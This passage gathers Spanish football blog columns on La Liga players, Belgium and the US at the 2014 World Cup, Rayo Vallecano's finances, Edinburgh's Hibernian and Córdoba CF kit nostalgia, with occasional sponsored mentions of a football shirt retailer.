anecdótico. Es muchísimo menos frecuente, que ese partido se dispute precisamente en el Santiago Bernabéu. El portero camerunés del Málaga sujetó el pasado sábado a los suyos con una destacadísima actuación bajo la portería del feudo madridista. Atajó al menos tres balones que llevaban en su trayectoria el inquietante soniquete del gol (uno a Jesé, otro a Benzema y un tercero a Cristiano Ronaldo) y salió de Chamartín erigido en héroe de su afición.Yevhen Konoplyanka. El ucraniano salió desde el banquillo, como viene siendo habitual desde su llegada a Nervión el pasado verano, para romper la dañina trayectoria sevillista. Con un golpe maestro, y cuando más nervioso andaba el equipo, colocó un lanzamiento de falta allí donde Toño nunca hubiera podido llegar. No le hizo falta más para acabar siendo el hombre del partido. Por fin fue decisivo, por fin justificó su contratación.El sevillismo vuelve a sonreír y Emery respira.Manu Trigueros. Quiero personalizar el fulgurante momento del Villarreal, nuevo líder de la clasificación, en la figura del centrocampista talaverano. Habitual en labores oscuras dentro de los esquemas de Marcelino, su papel junto al capitán Bruno en el eje del campo fue decisivo el pasado sábado ante el Atlético de Madrid. Roba y distribuye, dando mucho agilidad a la circulación de balón amarilla.Lucas Pérez. Para muchos, el hombre de la jornada (y ya es la segunda ocasión en la que aparece en nuestro Café del lunes). El coruñés es el líder, tanto espiritual como deportivo, de un Dépor que se ha encaramado en este arranque de temporada a posiciones europeas y que ansía poder cambiar de objetivo tras tanto tiempo jugando en el alambre del descenso. Pese a la reconversión a la que le ha sometido Víctor Sánchez de interior a punta de lanza, Pérez es un atacante versátil, con un catálogo de registros variadísimo y una íntima relación con el gol. Un campeón del mundo observa desde el graderío. A simple vista podría ser un espectador cualquiera, un aficionado que sufre y vibra con cada acción de los jugadores de su equipo. Pero su visión es diferente a la del aficionado común. Su ojo clínico analiza cada detalle con precisión, escruta cada movimiento sobre el césped y prevé el más mínimo desajuste táctico. Iomar do Nascimento, Mazinho, es un privilegiado. Un superdotado que, vestido de corto, domaba el ritmo de los partidos y veía el fútbol como pocos y que ahora probablemente, cuando ya sus botas ven la luz en contadísimas ocasiones y exclusivamente para matar el gusanillo con sus amigos, sigue teniendo un don especial para concebir el fútbol.La mirada de Mazinho recoge en su campo de visión toda la evolución del fútbol desplegado por el RC Celta de Vigo. Pero sus ojos se centran con particular detenimiento en un futbolista. De los once celestes, es uno en concreto el que intensifica la capacidad de análisis del exmediocentro brasileño. Rafinha Alcântara es, en palabras de su propio progenitor, ‘más Mazinho’ que su hermano mayor Thiago, futbolista agraciado tal vez con una mayor capacidad técnica y especialmente dotado para el último pase. Rafa, en cambio, tiene una traza más cercana a la de su padre, aunque con una clara vocación ofensiva con respecto al rol más conservador que desempeñaba aquel. Mayor fuerza física que su hermano, mayor regularidad y presencia sobre el verde y una envidiable clarividencia táctica y posicional. Un diésel con un potentísimo tren inferior y una capacidad de sacrificio que haría las delicias de cualquier entrenador que lo tuviese a sus órdenes.No debe ser sencillo crecer bajo el análisis permanente de la mirada de un padre que ha sido referencia en la profesión. El elevado nivel de exigencia ha curtido y madurado como futbolista a los hermanos Alcântara. Thiago comienza a ser claro referente en el Bayern de Guardiola. Rafa, para disfrute, por el momento, de la afición viguesa, es el elemento que hace que el juego del cuadro de Luis Enrique se sitúe en un plano superior. Su espectacular arranque de 2014, con un estado de forma insuperable, ha despejado todas las dudas planteadas sobre su figura tras unos irregulares primeros meses como celtista en los que las piernas parecían pesarle más que el cerebro. Tanto es así, que su incidencia sobre el juego del Celta en las últimas jornadas ha llevado a los vigueses a acumular una racha de diez puntos de los últimos quince en juego.Mazinho, sin embargo, no baja la guardia. Sigue analizando con escrupuloso detalle. Observando cada gesto de su hijo, puliendo cada jugada y cada decisión que éste toma, para que todas tengan sentido. Nunca es tarde para aprender de todo un campeón del mundo. Me van ustedes a disculpar el hecho de hablar a toro pasado, pero jamás me creí a la Bélgica estratosférica que se nos vaticinaba desde algunos frentes. Era plenamente consciente de que el combinado belga había conseguido reunir una generación extraordinaria y preveía, porque era algo que más o menos se veía venir desde hace tres o cuatro años, que no acudiría a la cita brasileña a hacer bulto. Bélgica dobló la rodilla ante Argentina en los cuartos de final (1-0). Realmente, ofreció muy poco Argentina. Y lo peor que se le puede achacar a los chicos de Marc Wilmots es que, habiendo ofrecido tan poquito su contrincante, no fuesen capaces de vender un poco más cara su derrota.Hubo quien calificó la eliminación belga de decepción. Eran aquellos que, no sé, tal vez esperaban ver a Bélgica jugando una final de un Campeonato del Mundo, así de repente. Cervezas trapenses, bandes dessinées y campeones del mundo de fútbol. Sí, seguro. Y fue como si la gente pidiera cuentas a los belgas por no haber sido capaces de cumplir con las desmesuradas expectativas que sobre ellos se habían venido depositando. Como si el simple hecho de no haber cumplido con una previsión que les quedaba grande como un traje heredado les convirtiera en culpables de algo.La sensación, tras escuchar al portero, es que sólo su pundonor  los hace salir al campo. Ante las preguntas de algunos periodistas, diciéndole que su buena racha era la consecuencia de querer subir cuanto antes para garantizarse un comprador, Cobeño fue sensato: somos líderes a seis puntos del tercero y la gente no hace cola para comprar al Rayo.Está claro que el fútbol es un negocio salvaje que necesita algo de freno. El principal problema es el disparate económico en sueldos, traspasos, comisiones y el blanqueo y uso ilícito de algunos dirigentes. Es imposible mantener el equilibrio financiero con unos gastos fijos abrumadores y con unas intenciones poco claras. El sobreprecio es habitual en representantes y propios futbolistas, también la doble contabilidad, o la especulación pura y dura, es decir, hacerse con el club para encontrar ganancias instantáneas y después abandonarlo a su suerte bien esquilmado. Un reparto equilibrado, unos topes salariales y un control más exhaustivo de las cuentas son indispensables al menos en las categorías menos lustrosas, antes de llegar a las grandes fortunas que dominan el fútbol español. Casos como el del Betis, Rayo, Oviedo, Jaén o la antigua desaparición del Málaga o el Logroñés deben ponernos en alerta ante un negocio peligroso e inestable para socios, aficionados y para la propia salud de nuestra liga.El caso del Rayo no será el último. Hay otros a la espera de decisiones judiciales, compras fantasmales –la situación del Córdoba da para una novela- o leyes concursales. La sensación de que la economía de nuestro fútbol va como un funámbulo sobre el alambre es innegable. El cierre patronal abortado por la jueza es solo una porción más de la incesante búsqueda de ingresos que puedan calibrar unas cuentas abultadas e ingobernables.Mientras tanto Cobeño, Piti, Movilla y compañía dudan entre abandonar o seguir jugando gratis para lograr que el equipo de Vallecas logre el ascenso.Lejos de celebrar su situación, los futbolistas vagan por el campo de entrenamiento, por los despachos o por las ruedas de prensa pensando en sus deudas y sus impagos. A ellos, habituales privilegiados del fútbol, ahora se les niega el mínimo necesario para vivir con arreglo a sus previsiones. La gestión de la familia Ruiz Mateos ha sido ruinosa para el equipo y, desgraciadamente, es sólo una muesca más en la crítica situación de nuestro fútbol. Un puñado de futbolistaspertenecen a la élite.Unos mil jugadoresson bastante buenos.Pero nosotros somos decenas de milesque no somos nada,ni podremos ser algo.Cuando el médicome miró el maltrecho meniscoy dijo: típico de futbolista,sentí una cierta alegríaa pesar del dolor.Porque había dicho:futbolista.Bengt Cidden Anderson,traducción de Francisco J. Úriz. Pocas veces coinciden en fútbol los títulos y los méritos. Los mejores a veces pierden y los mediocres a veces ganan. En Sudáfrica los puristas respiraron aliviados, el mejor juego había tenido su justo premio. El talento recibió su trofeo, y después todo volvió a la normalidad. La normalidad que es hoy, miércoles desapacible de noviembre, un partido de fútbol internacional entre Portugal y España. El motivo es ilusionante, refrendar la Candidatura Ibérica para organizar el Mundial del 2018. Habrá manifiesto previo y no descarto que hasta suelta de palomas. Los grandes eventos son así, inflados y superfluos. Después correrá el balón y empezará el fútbol, que es lo que nos interesa, aunque a mí hoy un poco menos.El partido para España es intrascendente. No habrá probaturas ni experimentos, no vamos a testar sistemas, ni darles cancha a jugadores nuevos, ni preparar nada importante. La clasificación para la Eurocopa ha comenzado bien, plácida, y en verdad la proliferación espontánea y achampiñonada de partidos de selecciones ha traído más dolor de cabeza que espectáculo. Los encuentros contra España tienen dos caras. La primera es la que duele, cuando los hombres de Del Bosque tienen el día son capaces de amargar a cualquier cuadro. Le pasó a Francia o Polonia, borradas por la superioridad táctica española en un par de amistosos pasados. También, como comprobamos a primeros de septiembre, tenemos otra cara. Una especie de pomada para el dolor ajeno como la que se untaron los argentinos a nuestra costa. Sergio Batista salió reforzado de aquello y la albiceleste enjugó derrotando a la campeona el mal sabor de boca que le dejó la travesía sudafricana.Es interesante, tal vez, ver como ha progresado Portugal. Nuestra compañera de candidatura viene de uno de los periodos más oscuros de su reciente historia. Queiroz, el iluminado, arrastró por el fango a un equipo con graves crisis de identidad, con jugadores fuera de sitio como cromos desordenados por el viento. Aún así llegaron a octavos de final en la Copa del Mundo. Cayeron contra España tras un partido seco y vibrante, solo desnivelado por la presencia de Llorente y el acierto de Villa en el último momento –ay, que gratos recuerdos-.Doce años después de su última presencia mundialista, creo que no se les debía exigir mucho más de la ofrecido, que en el global del torneo no fue poco.Un único futbolista de los veintitrés citados para acudir a Brasil sobrepasa los veintiocho años de edad. Daniel van Buyten, que ha acompañado al capitán Vincent Kompany en el eje de la zaga durante todo el torneo, no volverá, a sus treinta y seis tacos, a jugar en un Mundial. El resto de sus compañeros en este viaje bien podrán, por edad, llegar a la cita rusa de 2018 en plenitud de condiciones. Llegará el propio Kompany, con treinta y dos, consolidado como el mejor defensa de la historia del país. Llegará Courtois, con veintiséis, al que para entonces nadie podrá discutir el título honorífico de mejor portero del planeta. Lo hará también Axel Witsel, que con veintinueve años quizá ya haya decidido dejar de pasar frío y engrosar cuenta corriente en San Petersburgo y ruede por fin a un ritmo realmente competitivo. Y los acompañarán Lukaku, Hazard, De Bruyne o Januzaj. Ninguno de ellos llegará aún a la treintena. Quizá entonces ya no podamos hablar de revelación, sino de realidad palpable aspirante a todo. Sería la mejor señal posible para esta generación belga. Aunque dejaran de ser tema de conversación elevada. Jürgen Klinsmann tiene ante sí una doble misión. Por un lado, debe guiar a la selección nacional de Estados Unidos hacia los cuartos de final del Mundial 2014, para lo que deberá imponerse a una Bélgica que cuenta sus tres partidos mundialistas por victorias y que, a ojos de la mayor parte de los aficionados, continua siendo un buen outsider con muchas ganas de protagonismo. Por otro, el técnico alemán, que se hiciera cargo del equipo de las barras y estrellas en verano de 2011 en sustitución de Bob Bradley, lucha contra un gigante en forma de estigma insalvable: el fútbol no termina de calar en el país.Bien es cierto que convendría trazar una separación entre lo que supone el fútbol de clubes y la competición liguera local y lo que implica la selección nacional, siempre potenciada por el fuerte sentimiento patriótico que impregna casi cada expresión de la sociedad norteamericana. Cuando el equipo nacional entra en competición, el asunto deportivo se convierte en una cuestión de estado, con el propio presidente Barack Obama a la cabeza y su ‘One team, one nation‘ como emblema. La necesidad de espectacularidad y plasticidad inherente a las cuatro grandes disciplinas deportivas estadounidenses (fútbol americano, baloncesto, béisbol y hockey hielo) pasa entonces a un segundo plano. Ya no resulta condición indispensable que alrededor del evento deportivo se monte un espectáculo mediático, con las industrias del entretenimiento y la comida rápida aprovechando los descansos y tiempos muertos para discutirle el protagonismo al propio partido. Cuando los de Klinsi entran en liza, pocos se preocupan ya de que el soccer sea ‘un deporte aburrido‘, como concluye un elevado porcentaje de la población yankee.El fútbol en Estados Unidos se encuentra en un momento fundamental, casi definitivo. Cuentan con una selección competitiva, con una Liga que cada vez llama a más futbolistas reconocidos y su popularidad entre los más jóvenes y la numerosa comunidad latina sigue creciendo año tras año. Pero necesitan que su combinado nacional arrastre a todos los indecisos e incrédulos, a todos los que no terminan de entender cómo perdiendo un partido puedes clasificarte para la siguiente ronda del torneo mundialista y ganándolo puedes llegar a quedarte fuera. El equipo de Klinsmann lucha contra la Bélgica de Hazard, Lukaku y Courtois, pero también encarna una especie de movimiento contracultural en un país que es referencia mundial en la gran mayoría de disciplinas deportivas en las que se propone reinar. Tal vez sea la cultura estadounidense, que no concibe algo aparentemente tan sencillo como el concepto del empate en una competición deportiva. O puede que sea esa idea extendida de que el soccer es un deporte sin un fuerte contacto físico porque está especialmente dirigido a los niños. Conseguir que la semilla del fútbol encuentre terreno fértil en tal escenario, enganchar a la población a un deporte que rompe radicalmente con la potentísima y arraigada cultura deportiva del país, puede ser más complicado aún que ganarse una plaza entre las ocho mejores selecciones del mundo. Dani Alves. Su trayectoria, como su vida, no responde a ninguna lógica. Terminó la pasada campaña dando una rueda de prensa en la que avisaba de que su futuro inmediato estaba fuera del FC Barcelona. No se sentía suficientemente valorado por el club, decía. Quiero que me suban la nómina ahora que ya estoy entrado en años, traducíamos los mortales. Para terminar de rizar el rizo de la inestabilidad, el arranque de temporada del carrilero brasileño está rayando en su mejor nivel conocido. Contra la Real fue un estilete por el costado derecho. Profundo e hiperactivo, como en sus mejores tardes, de sus botas, tras sendos centros laterales, nacieron dos de los goles azulgranas.Tiago Mendes. Ya la pasada semana, tras un brillante partido ante el Betis (uno más desde la sombra), estuvimos charlando sobre el mediocentro portugués y a punto estuvo de entrar entre los cinco escogidos de la jornada. Sí entra esta semana, aunque no sea por un motivo feliz. Su grave lesión hace temblar al Atleti, porque su presencia aporta la dosis de equilibrio necesario en cualquier equipo desatado, como acostumbra a ser el de Simeone. A la espera de la llegada de Matías Kranevitter (y a la espera de ver la adaptación de éste), los colchoneros quedan huérfanos de oficio en la medular.Ángel Lafita. No puede decirse que el centrocampista maño llegase a Getafe para triunfar. Su trayectoria en el Coliseum, donde cumple ya su cuarta temporada, ha sido considerablemente errática.A una buena actuación, seguían varias semanas de aislamiento e intrascendencia. El entorno y las graves lesiones tampoco ayudaban, claro. Actuaciones como la de la mañana del domingo ante el Villarreal, con un buen gol para abrir el partido y un regalo para que Álvaro Vázquez hiciese el segundo de los azulones, hacen recordar lo bueno que llegó a ser Lafita (aquella temporada en el Dépor…) y dejan un punto de nostalgia sobre lo que pudo llegar a ser.Mariano Ferreira. Leía ayer en Twitter que cuesta creer que alguien llamado Mariano haga algo bien… Bromas aparte, el partido del lateral brasileño del Sevilla fue una auténtica delicia y una magnífica presentación en sociedad para aquellos que todavía no lo teníamos demasiado analizado al exjugador del Girondins. Constante en su profundidad por la banda derecha, su verticalidad y su derroche ofensivo supusieron un dolor de cabeza constante para la zaga del Valencia. Una de las revelaciones de la temporada.Aritz Aduriz. Dejamos el último lugar para el que, sin duda, fue el futbolista más destacado de toda la jornada. Un hat-trick perfecto (uno de diestra, otro de zurda y un último de cabeza) sirvió para que el Athletic sumara tres nuevos puntos en su visita a Vallecas. Se pierde ya la cuenta de los puntos que el punta donostiarra le ha hecho ganar a los leones en la presente temporada. Sus tres goles, además, llegan para cerrar una semana en la que, tras la brillante victoria europea en Ausburgo, Aduriz disparaba la euforia de la parroquia al fijar sin rubor los más altos objetivos para el Athletic. La ambición y la determinación del veterano delantero no se quedan solo ante los micros.Ese partido, tan cercano, resta más interés –si cabe- al que se juega esta noche. La mejoría de los hombres de Paulo Bento, su nuevo -¡y cabal! - orden táctico, puede ser un motivo para ver los noventa minutos.La prensa, siempre atenta, ha encontrado en el clasiquismo el filón para vender el partido. Mucho madridista y barcelonista suelto sobre el césped del Estadio da Luz. Lo de siempre. Resumo mi particular previa: esta noche en La 2 ponen Plácido. Si la han visto, deberían revisitarla ahora que murió Berlanga. Si no la han visto, pierden el tiempo, es una obra maestra. Este verano han pasado cosas muy importantes. Me redujeron la jornada laboral por los recortes y me veo obligado a vivir con quinientos euros al mes. Me dejó por teléfono mi novia, de la que estaba profunda y absurdamente enamorado. Intenté hacer salmorejo, por primera vez en mi vida, con un resultado que quedó más cerca de Saw V que de Master Chef. Y, sobre todo, leí Trainspotting, Porno y Cola de Irvine Welsh. Por eso cuando busqué un billete barato para salir unos días de este país que, gracias a la inutilidad y a la poca vergüenza, parece un queso emmental; no dudé en elegir Edimburgo para pasar mis vacaciones al tímido sol escocés.Los personajes de Welsh se mueven cómodamente entre las pocas cosas que en esta vida tienen importancia: alcohol, sexo y fútbol. Edimburgo es el álbum infantil donde pegar los cromos. En Edimburgo conviven a gritos, como una pareja que hace tiempo que no se quiere, dos equipos: Heart of Midlothian e Hibernian FC. No hace falta leer demasiado una de las novelas que nombro para saber con cuál de los dos hay que ir. Si algo nos ha enseñado el fútbol es que, puestos a jugar a esa estupidez de ser de un equipo de forma artificial, es decir, no con el corazón sino con el cerebro, lo mejor es elegir el más lamentable. No es lo mismo ser del United que del City. Ser de los primeros es vivir en el éxito, ser de los segundos es ser un tierno outsider. No es lo mismo ser del Bayern Munich que del St. Pauli. Ser de los primeros es aplaudir el poder del dinero y ser del segundo es presumir de alternativo progresista. En los dos equipos de Edimburgo la diferencia está menos clara: los dos son equipos perdedores. Pero el Hibernian, quizá, está un peldaño más abajo en esa escalera húmeda y apestosa que es el fútbol escocés.Hibernian es el equipo de los de Leith. Leith es el barrio donde Renton, Sick Boy, Spud y compañía se chutaban en Trainspotting. También donde el pobre Gally, el íntegro Birrell, el salido de Juice Terry y el atormentado Carl pasaron su infancia. Leith está al norte de la ciudad, lamido por el mar. El puerto abandonado por el progreso. Cuando estuve allí elegí un día lluvioso para subir a Leith Walk. Me levanté temprano. Di los buenos días a los indios con los que compartía habitación en el hostal en Cowgate. Y caminé abriendo el mapa bajo los soportales para no perderme. Fue un camino extraño. Vi un coche arder, me pareció parte de una novela. Cuando llegué a Great Junction Street pensé en los personajes que me habían acompañado durante los meses de lectura. Pensé que no estaría mal vivir allí. Busqué una tienda donde comprarme una camiseta, una bufanda o alguna bobada de los Hibs. No encontré nada. Los restaurantes hindúes copaban la calle. Tomé un café en un sitio extraño. Me atendió una chica. “¿español, no?” . Me reconoció por mi patoso inglés. Hablamos un poco bajo la atenta mirada de su jefe chino. Ella era de Granada. Quise decirle que si la recogía al terminar el turno para tomar unas pintas pero me dio vergüenza. Un personaje de Welsh lo hubiera hecho.Olvidé mirar donde estaba el estadio (Easter Road, era fácil de recordar) y pensé encontrarlo fácil por allí. Anduve un buen rato, llegué a The Shore, vi el océano estático con su brillo metálico, fundido con la niebla. Ni rastro del campo. Decidí abandonar el barrio, sin camiseta y sin estadio, para visitar Holyrood Park. Miré el manoseado mapa, imposible de doblar y mordido por los bordes. Lochend Road parecía el camino más corto.Los Hibs visten de verde y blanco. Casi como el Córdoba, pensé. Es absurdo tener antes una camiseta del Hibernian que la de mi propio equipo.Mi vida y su guión escrito por monos como en un capítulo de Los Simpsons. La lluvia frenó un poco y me dio tregua para bajar hasta Arthur´s Seat. Los Hearts visten con el color de la mermelada de fresa. Por eso les llaman jambos. En las novelas de Welsh todos odian a todos. Pero lo de los Hearts es patológico. George Best jugó en el Hibernian, no creo que sea casualidad. Bajaba por Lochend dejando atrás casas idénticas y sin vida. Miraba a todos lados como un turista. Como lo que era. Como un japonés en el Prado. Y allí estaba, a la derecha, el estadio tan feo y cuadrado como podía esperarse. Me acerqué tímidamente. No creo en los templos. Pensé en un Arcángel escocés por los colores. Allí a lo lejos. Con el cielo más gris y los niños más rubios. Volví a Lochend, después a Marionville, y me fui alejando de todo aquello. Vi a un niño escocés con la camiseta de la senyera del Barça. No pateaba ningún balón. Sólo estaba allí, en medio del jardín de su casa. A lo mejor nunca había ido al estadio que estaba a diez minutos andando de su calle. No creo que Messi pise alguna vez ese césped. De lejos parecía uno de esos campos abandonados donde salen jaramagos en el círculo central y flores amarillas bajo los palos. Donde la naturaleza vence al cemento. Con pintadas y yonquis forzando la puerta de las taquillas para chutarse. No sé como Welsh no pensó en eso.A la tarde quedé con un amigo. Trabaja en Ryanair. Le pregunto por el fútbol. Él es de Sevilla y bético. Estamos en una ciudad donde juega un equipo que va de verde y blanco dos chicos cuyos equipos son verde y blanco y blanco y verde. Pedimos dos pintas de Tennent’s y el dorado acabó con la estupidez cromática. Nunca ha ido al fútbol en Edimburgo. Ya lleva allí un año. Le pilla lejos, vive cerca del aeropuerto, en Corstorphine. Tampoco se muestra muy entusiasmado. “¿Dónde puedo comprar una camiseta de los Hibs?” , le pregunto. “Es más fácil encontrar una escocesa guapa que una camiseta del Hibernian en esta ciudad”. Nos reímos y paso al plan B: tendré que comprarme una camiseta del Córdoba cuando vuelva a España.Puedes comprar camisetas del Hibernian, y de cientos de equipos más, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol. Cada quince días y de la mano de Classic Football Shirts, la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.No hay nada como el hogar. Dicen. Por más vueltas que de la vida siempre recordamos el punto de inicio. Como en un poema de Kavafis, la existencia no nos hace disfrutar de los destinos sino del trayecto que nos lleva hacia ellos. Cuando abandoné Córdoba lo hice sin demasiado cariño a sus colores. Una etapa de letargo, de trapicheo de despacho, de falta de ilusión en el colectivo, me hicieron rechazarlo poco a poco. Sacarlo de mí como una espina sale lentamente del dedo expulsada por la piel para prevenir el daño. Es una medida vaga, lo sé, hay gente que siente de tal manera con su equipo que no entienden que los colores puedan echarse del pecho de uno. Lo asumo. Amar un equipo acostumbrado al buceo por las categorías inferiores, tras años de lucha en el subsuelo, es difícil para un niño. Aún así y madurando, ese artificial proceso que nunca termina, terminé por animar al Córdoba como uno más, a disfrutar de sus éxitos y, como mandan los cánones, a dramatizar sus fracasos. Fui conociendo a gente del club, rodeándome de amigos fieles, y comencé a sentirme parte de todo un sentimiento.Después me fui a Málaga y, como en el amor, la distancia va matando poco a poco el deseo.Ayer vi en la biblia del coleccionismo textil dos camisetas del Córdoba Club de Fútbol, las primeras que veo ahí expuestas. Y no son camisetas cualesquiera, son algo más. Antes de que Nike dominara el mundo, antes de que Joma o Li-Ning jugaran con nuestros sentimientos, Umbro dominaba la tierra. Y el Córdoba vistió de Umbro durante un largo periodo de su historia. La primera es de la temporada 1999-2000, away, de brillante verde. Retro, histórica, con Salenko, Leiva, Navarro y Quero en la memoria. Tras la hazaña del Cartagonova, una plácida decimosegunda posición en la tabla. Tiempos felices para los blanquiverdes. La siguiente camiseta que nos regala el recuerdo es la otra cara de la moneda. 2004/2005. Con Crispi en el banquillo el Córdoba descendió a Segunda B. Cuando todo parecía atado y bien atado en el club, tras años de desempeño en la categoría de plata, el equipo descendió sin más. Valladolid fue el ejecutor. A vivir de nuevo en la oscuridad del campo de césped y el desfile por pueblos de Andalucía. No sé si fue el último año de Umbro, me gustaría pensar que sí.Después vinieron las marcas propias, la industrialización de los colores, las leyes concursales, las ventas a los italianos y demás morralla histórica. Este año empezamos la Segunda División con una alegría extraña, casi infantil. Sin grandes objetivos pero con la conciencia tranquila tras una temporada peligrosa en el césped y en las oficinas. Cuando ruede el balón en el Nuevo Arcángel pensaré en el hogar. Desde la costa malagueña, esta pseudo-colonia califal, golpearé los talones como Dorothy para ver si aparezco, de nuevo, en las gradas entre bufandas blancas y verdes, con una camiseta de Umbro a poder ser, desde luego, mejor que unos chapines de rubíes. Somos invisibles para las ciudades, pero las ciudades marcan nuestra existencia. Es injusto, pero inevitable. Uno nace donde nace, pero la vida después te lleva de aquí para allá, como una pelota hinchable inalcanzable para el niño, azotada por el mar. He pasado los últimos cuatro años de mi vida en Málaga y ahora hago las maletas para vivir en Sevilla. Cierto que la vida me sonríe y que, como los alienígenas amarillos de Toy Story, tengo la sensación de ir a un mundo mejor. Nada que ver con la ciudad, pero sí con el amor, el trabajo y la estabilidad. Males necesarios para los humanos. Mi reloj biológico sigue siendo un Casio al que si enciendes la luz se le borran los números. Pero está bien así. Estoy feliz, aun dejando parte de mi vida atrás. Como ya hice, años atrás, dejando Córdoba por la costa. Un marinero improvisado.Las ciudades están llenas de camisetas de fútbol. En Málaga y Sevilla se ve muy claro. Desde mi terraza veía La Rosaleda. Los días de partido mareas de blanco y celeste bajaban por mi calle hasta el estadio. Yo escuché los gritos de los aficionados cuando Santa Cruz batió a Helton consiguiendo la clasificación a cuartos en la Champions. Son recuerdos que no se olvidan. Los gritos en la calle a la vuelta. Esa sensación de no creerte lo que estaba pasando, tan infantil y entrañablemente absurda. O cuando trabajaba con menores y les decía, al principio: ¿Qué eres del Madrid o del Barça? Y me contestaban: del Málaga. Con un orgullo pueril e invencible.Nada más llegar a Sevilla vi bajar por la escalera de mi nuevo bloque a un chico con la camiseta del Sevilla. Y pensé en que podría perder la memoria de repente, que siempre sabría dónde estoy por estos uniformes del fútbol. Aquí el blanco y el rojo se mezclan con el verde y el blanco. Tendré que aprender a vivir entre tres colores. Como el Córdoba ahora no es competencia, no me sonrojará salir con mi camiseta por la ciudad. Me mirarán con cierto paternalismo, y tendré que asumirlo, al menos hasta que subamos en junio y le pongamos las cosas difíciles el año que viene.Las ciudades son el fútbol que albergan. Silencioso o ruidoso, con estadios en el centro o en la periferia. Y los embajadores del fútbol son sus aficionados, disfrazados de futbolistas en sus quehaceres diarios. No te fíes de una persona que no haya bajado la basura con la camiseta de su equipo ni haya pisado un estadio. Me voy de Málaga con pena, pero me lanzo a Sevilla con la ilusión intacta.Puedes comprar camisetas del Sevilla, Betis y Málaga, con un completísimo muestrario desde los años ochenta hasta la actualidad, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. La camiseta amarilla, el pantalón azul y las medias blancas. A mí, de pequeño, esta equipación me daba más miedo que el hombre del saco. Ya de mayor se me fue quitando la congoja pero a veces, como el otro día cuando sonaba el himno en el partido inaugural del Mundial, vuelvo a sentir el escalofrío de sentirme inferior, de asistir dócilmente al espectáculo del Fútbol –en mayúsculas-. De los que apenas vi –Pelé, Sócrates, Careca, Rivelino…- y de los que me amargaron más de un verano –Rivaldo, Romario, Ronaldo, Bebeto, Mauro Silva…-; tengo el recuerdo de futbolistas con talento, imaginativos, mágicos, innovadores y entregados a sus colores.Hoy Brasil ha empatado contra México tras jugar un fútbol que no puede ni acercarse a los adjetivos que antes enumero. La apuesta de Scolari es ramplona y el otro día, contra Croacia, tuvo que ser el desatino arbitral –ese ridículo penalti señalado a Lovren– el que diera aire a una Selección que está lejos, muy lejos, de los hitos futbolísticos que jalonaron su historia. Hay jugadores con talento. Está Neymar, que es un enorme jugador al que el equipo aún le pesa demasiado. Óscar, aunque hoy no haya estado al nivel del otro día. Paulinho, del que se espera más aportación en ataque. Y luego hay jugadores que no entiendo: David Luiz, un central que está haciendo bueno a Pavón. Fred, el delantero-tótem: estático y enigmático. Alves lejísimos de su mejor momento. Jugadores que deslucen al equipo anfitrión, que dejan las vitrinas de la canarinha sucias como el servicio de una estación de buses.El problema es que, como decía el tío de Spiderman: “un gran poder requiere una gran responsabilidad”.Y a Brasil podemos pedirle lo que nos apetezca porque ahí está youtube para tener la imagen exacta de este equipo. Y Scolari, con su gesto de preocupación forzada, nada tiene que aportar a unos hombres que deben, en casa, demostrar lo que Brasil supone a este deporte. Por eso hoy me aburrieron y me desesperaron, por eso hoy México mereció ganar. El equipo de Herrera salió con decisión a por la victoria. La defensa poblada no desconectó la comunicación con Guardado y Gio. Peralta y después Chicharito tuvieron balones, el medio del campo fundió a los brasileños y en los últimos minutos casi lo tuvieron. También es cierto que la estrella fue Ochoa, que paró todo lo que iba al arco. Porque Brasil, pese a lo descacharrante de su juego, de lo ridículo de su apuesta, de las dificultades que tiene para hilvanar pases con peligro, a veces las tiene. Por Neymar, por un crecido Marcelo, o por la chispita de Willian. Pero podemos pedir más. Y como aficionados, ¿por qué no hacerlo?Raul Seixas fue vanguardia rock en la Brasil folclórica de los setenta. De todas sus canciones hay una, Metamorfose Ambulante, que me emociona sobre las demás. La canción habla del cambio, de no permanecer estático en el mundo. De ser una estrella que se apaga, de odiar y amar, de no tener medida ni límite. Sólo amor. Escribo sobre Brasil mientras escucho a Seixas. Qué bien está eso de ser una metamorfosis andante, pero qué bien hubiera estado si Scolari no hubiera mudado los valores de la Selección que dirige. Si hubiera perpetuado el espectáculo. Haberlo intentado al menos. No dejar que el equipo muera de inanición.Llegue donde llegue, y aquí más pragmático que yo no hay, el amarillo, azul y blanco no brillan como yo recordaba. Acabo el día con Seixas. No es poco. La gente de bien somos de encontrar cosas bonitas donde Scolari apenas nos ha dejado nada. Y si Neymar llora no es por el himno, sino por lo mal que juegan. El batería del grupo donde toco es sevillista. Mucho. Aún recuerdo cuando llegó al local de ensayo diciendo, tras un hat-trick en la primera jornada de liga, que Kepa era el futuro 9 de España. Sirva el ejemplo para catalogar su nivel de “fanatismo” hispalense. Este año hemos discutido mucho sobre su equipo. Ángel criticaba a Jiménez. Decía que era un mister cobarde, sin ideas, con mucho carácter pero poca experiencia para llevar al Sevilla donde merece por plantilla y trayectoria reciente. Yo defendí al técnico sevillano hasta el mismo día en que lo echaron. Me gustaba su fútbol directo, su rigidez defensiva y una personalidad que destilaba amor a los colores. Me transmitía serenidad y el equipo no andaba tan mal. La eliminación contra el CSKA fue un duro golpe pero no puede hacer olvidar la magnífica fase de grupos. En cualquier caso, el argumento de mi amigo era el mismo que esgrimían miles de socios del club andaluz cuando pedían la marcha de Manolo Jiménez, aún estando siempre cerca de los puestos de Champions, aún estando vivos en Copa, que a la postre ganarían, y, pese al fatal desenlace, jugando bonito en la máxima competición europea. Para mí esta temporada del Sevilla ha sido agridulce. Conseguidos dos grandísimos objetivos, Copa y plaza europea, se han destapado algunos de los problemas que llevaban tiempo asomando. En primer lugar no haber encontrado al sucesor de Juande Ramos, a un técnico que sea aceptado unánimemente por directiva y afición y serene al caldeado –y exigente- Sánchez Pizjuán. Y por otro, la falta de acierto en las últimas incorporaciones. La renovación de la plantilla debe ser inminente, y será un trabajo tan arduo como impredecible en cuanto a los resultados.Esperaba más de este equipo. Cierto que las cosas no han ido bien dadas. Las lesiones y el pobre rendimiento de algunos jugadores importantes han lastrado al equipo. Jiménez no estaba cómodo, y aunque la liga empezó aceptable –ocho jornadas como terceros, victoria ante el Real Madrid incluida-, la alternancia en todas las competiciones y un escaso fondo de banquillo les hicieron despegarse de la zona noble de la Liga. Romaric sigue sin funcionar, Luis Fabiano ha estado más en enfermería que en el césped, a Kanouté se le van notando los años, Negredo ha estado demasiado intermitente, Konko sigue sin asomarse ni de cerca al lateral al que vino a 